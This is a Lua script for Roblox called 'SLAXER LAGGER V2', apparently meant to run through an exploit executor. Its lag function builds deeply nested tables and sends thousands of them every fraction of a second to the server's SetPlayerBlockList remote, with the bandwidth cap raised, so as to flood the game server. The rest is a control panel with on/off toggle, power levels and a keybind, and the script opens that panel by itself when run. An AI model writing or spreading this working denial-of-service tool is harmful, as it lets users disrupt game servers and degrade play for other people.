-- ============================================================
-- SLAXER LAGGER V2 - STANDALONE
-- ============================================================
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local player = Players.LocalPlayer

local M = {}
M.uiLocked = false
M.mobBtnRefs = {}

function M.unfreeze()
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if hrp then
        pcall(function() hrp.Anchored = false end)
        pcall(function() hrp:SetNetworkOwner(player) end)
    end
    for _, p in ipairs(char:GetDescendants()) do
        if p:IsA("BasePart") and p.Anchored then pcall(function() p.Anchored = false end) end
    end
    if hum then
        pcall(function() hum.PlatformStand = false end)
        pcall(function() hum.Sit = false end)
        pcall(function() hum.AutoRotate = true end)
        if hum.WalkSpeed <= 0 then pcall(function() hum.WalkSpeed = 16 end) end
        if hum.JumpPower <= 0 then pcall(function() hum.JumpPower = 50 end) end
        pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
    end
    pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
end

M.Lag = {}
M.Lag.on = false
M.Lag.thread = nil
M.Lag.level = "Low"
M.Lag.ui = nil
M.Lag.key = Enum.KeyCode.M
M.Lag.listening = false
M.Lag.POWER = {Low = 25, Mid = 32, High = 70}

function M.Lag.bomb(power)
    local main, spam = {}, {{}}
    local z = spam[1]
    for _ = 1, 25 do local t = {}; table.insert(z, t); z = t end
    local max = math.min(12000, power * 50)
    for _ = 1, max do table.insert(main, spam) end
    pcall(function()
        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
    end)
end

function M.Lag.set(on)
    M.Lag.on = on
    if on then
        if M.Lag.thread then pcall(task.cancel, M.Lag.thread) end
        M.Lag.thread = task.spawn(function()
            while M.Lag.on do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                M.Lag.bomb(M.Lag.POWER[M.Lag.level] or 25)
                task.wait(0.18)
            end
        end)
    else
        if M.Lag.thread then pcall(task.cancel, M.Lag.thread); M.Lag.thread = nil end
        pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
        M.unfreeze()
    end
    if M.Lag.setVisual then M.Lag.setVisual(on) end
end

function M.Lag.build()
    if M.Lag.ui and M.Lag.ui.Parent then return M.Lag.ui end
    for _, n in ipairs({"SLAXER_LAGGER_V2", "RXZ_LAGGER_UI", "BlessLagger_UI"}) do
        local old = game:GetService("CoreGui"):FindFirstChild(n)
        if old then pcall(function() old:Destroy() end) end
        local pgui = player:FindFirstChild("PlayerGui")
        if pgui then local o = pgui:FindFirstChild(n); if o then pcall(function() o:Destroy() end) end end
    end

    local gui = Instance.new("ScreenGui")
    gui.Name = "SLAXER_LAGGER_V2"
    gui.DisplayOrder = 20
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
    if not pcall(function() gui.Parent = game:GetService("CoreGui") end) then
        gui.Parent = player:WaitForChild("PlayerGui")
    end
    M.Lag.ui = gui

    local W, B, G = Color3.fromRGB(255,255,255), Color3.fromRGB(8,8,8), Color3.fromRGB(150,150,150)

    local panel = Instance.new("Frame", gui)
    panel.Name = "Panel"
    panel.Size = UDim2.new(0, 220, 0, 120)
    panel.Position = UDim2.new(0.5, -110, 0.28, 0)
    panel.BackgroundColor3 = B
    panel.BorderSizePixel = 0
    panel.Active = true
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 12)
    local pStroke = Instance.new("UIStroke", panel)
    pStroke.Color = Color3.fromRGB(45, 45, 45)
    pStroke.Thickness = 1.5
    local pScale = Instance.new("UIScale", panel)
    pScale.Scale = 0.85

    local bgImg = Instance.new("ImageLabel", panel)
    bgImg.Size = UDim2.new(1, 0, 1, 0)
    bgImg.BackgroundTransparency = 1
    bgImg.ZIndex = 0
    bgImg.Image = "rbxassetid://79622449502810"
    bgImg.ScaleType = Enum.ScaleType.Crop
    bgImg.ImageTransparency = 0.7
    Instance.new("UICorner", bgImg).CornerRadius = UDim.new(0, 12)

    local title = Instance.new("TextLabel", panel)
    title.BackgroundTransparency = 1
    title.Position = UDim2.new(0, 12, 0, 6)
    title.Size = UDim2.new(1, -70, 0, 18)
    title.Text = "SLAXER LAGGER V2"
    title.TextColor3 = W
    title.TextSize = 14
    title.Font = Enum.Font.GothamBlack
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.ZIndex = 2

    local ver = Instance.new("TextLabel", panel)
    ver.BackgroundTransparency = 1
    ver.Position = UDim2.new(0, 12, 0, 23)
    ver.Size = UDim2.new(0, 140, 0, 12)
    ver.Text = ".gg/slaxer"
    ver.TextColor3 = G
    ver.TextSize = 9
    ver.Font = Enum.Font.GothamBold
    ver.TextXAlignment = Enum.TextXAlignment.Left
    ver.ZIndex = 2

    local minBtn = Instance.new("TextButton", panel)
    minBtn.Size = UDim2.new(0, 22, 0, 22)
    minBtn.Position = UDim2.new(1, -30, 0, 6)
    minBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    minBtn.BorderSizePixel = 0
    minBtn.Text = "-"
    minBtn.TextColor3 = W
    minBtn.Font = Enum.Font.GothamBlack
    minBtn.TextSize = 18
    minBtn.ZIndex = 3
    Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 6)

    local restore = Instance.new("TextButton", gui)
    restore.Size = UDim2.new(0, 96, 0, 26)
    restore.Position = UDim2.new(0.5, -48, 0.28, 0)
    restore.BackgroundColor3 = B
    restore.BorderSizePixel = 0
    restore.Visible = false
    restore.Text = "SLAXER LAGGER"
    restore.TextColor3 = W
    restore.Font = Enum.Font.GothamBlack
    restore.TextSize = 10
    Instance.new("UICorner", restore).CornerRadius = UDim.new(0, 8)
    local rStroke = Instance.new("UIStroke", restore)
    rStroke.Color = Color3.fromRGB(45, 45, 45)
    rStroke.Thickness = 1.2
    minBtn.MouseButton1Click:Connect(function() panel.Visible = false; restore.Visible = true end)
    restore.MouseButton1Click:Connect(function() panel.Visible = true; restore.Visible = false end)

    local kbLbl = Instance.new("TextLabel", panel)
    kbLbl.BackgroundTransparency = 1
    kbLbl.Position = UDim2.new(0, 12, 0, 44)
    kbLbl.Size = UDim2.new(0, 90, 0, 16)
    kbLbl.Text = "KEYBIND"
    kbLbl.TextColor3 = W
    kbLbl.TextSize = 9
    kbLbl.Font = Enum.Font.GothamBold
    kbLbl.TextXAlignment = Enum.TextXAlignment.Left
    kbLbl.ZIndex = 2

    local kbBtn = Instance.new("TextButton", panel)
    kbBtn.Position = UDim2.new(0, 72, 0, 42)
    kbBtn.Size = UDim2.new(0, 30, 0, 18)
    kbBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
    kbBtn.BorderSizePixel = 0
    kbBtn.Text = M.Lag.key.Name
    kbBtn.TextColor3 = W
    kbBtn.TextSize = 9
    kbBtn.Font = Enum.Font.GothamBold
    kbBtn.AutoButtonColor = false
    kbBtn.ZIndex = 2
    Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0, 4)

    local pill = Instance.new("Frame", panel)
    pill.Position = UDim2.new(1, -64, 0, 42)
    pill.Size = UDim2.new(0, 52, 0, 22)
    pill.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    pill.BorderSizePixel = 0
    pill.ZIndex = 2
    Instance.new("UICorner", pill).CornerRadius = UDim.new(1, 0)
    local pBtn = Instance.new("TextButton", pill)
    pBtn.Size = UDim2.new(1, 0, 1, 0)
    pBtn.BackgroundTransparency = 1
    pBtn.Text = "OFF"
    pBtn.TextColor3 = W
    pBtn.TextSize = 10
    pBtn.Font = Enum.Font.GothamBold
    pBtn.ZIndex = 3

    local levelBtns = {}
    local function refreshLevels()
        for name, b in pairs(levelBtns) do
            local on = (M.Lag.level == name)
            b.BackgroundColor3 = on and W or Color3.fromRGB(22, 22, 22)
            b.TextColor3 = on and Color3.fromRGB(0, 0, 0) or W
        end
    end
    for i, name in ipairs({"Low", "Mid", "High"}) do
        local b = Instance.new("TextButton", panel)
        b.Size = UDim2.new(0, 62, 0, 24)
        b.Position = UDim2.new(0, 10 + (i - 1) * 68, 0, 76)
        b.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
        b.BorderSizePixel = 0
        b.AutoButtonColor = false
        b.Text = name:upper()
        b.TextColor3 = W
        b.TextSize = 10
        b.Font = Enum.Font.GothamBold
        b.ZIndex = 2
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
        b.MouseButton1Click:Connect(function() M.Lag.level = name; refreshLevels() end)
        levelBtns[name] = b
    end
    refreshLevels()

    M.Lag.setVisual = function(on)
        pBtn.Text = on and "ON" or "OFF"
        pill.BackgroundColor3 = on and W or Color3.fromRGB(30, 30, 30)
        pBtn.TextColor3 = on and Color3.fromRGB(0, 0, 0) or W
        if M.mobBtnRefs and M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(on) end
    end
    pBtn.MouseButton1Click:Connect(function() M.Lag.set(not M.Lag.on) end)
    M.Lag.setVisual(M.Lag.on)

    kbBtn.MouseButton1Click:Connect(function()
        M.Lag.listening = true
        kbBtn.Text = "..."
    end)
    UIS.InputBegan:Connect(function(inp, gp)
        if inp.KeyCode == Enum.KeyCode.Unknown then return end
        if M.Lag.listening then
            M.Lag.key = inp.KeyCode
            M.Lag.listening = false
            if kbBtn and kbBtn.Parent then kbBtn.Text = M.Lag.key.Name end
            return
        end
        if gp then return end
        if inp.KeyCode == M.Lag.key and M.Lag.ui and M.Lag.ui.Parent then
            M.Lag.set(not M.Lag.on)
        end
    end)

    local dragging, dragStart, startPos = false, nil, nil
    panel.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = i.Position
            startPos = panel.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    UIS.InputChanged:Connect(function(i)
        if not dragging then return end
        if M.uiLocked then return end
        if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then
            local d = i.Position - dragStart
            panel.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
    return gui
end

function M.Lag.open()
    local gui = M.Lag.build()
    if gui then
        local panel = gui:FindFirstChild("Panel")
        if panel then panel.Visible = true end
        gui.Enabled = true
    end
end

function M.Lag.close()
    M.Lag.set(false)
    if M.Lag.ui then pcall(function() M.Lag.ui:Destroy() end); M.Lag.ui = nil end
end

function M.Lag.toggleGui()
    if M.Lag.ui and M.Lag.ui.Parent then M.Lag.close() else M.Lag.open() end
end

task.spawn(function()
    task.wait(0.3)
    pcall(M.Lag.open)
end)

return M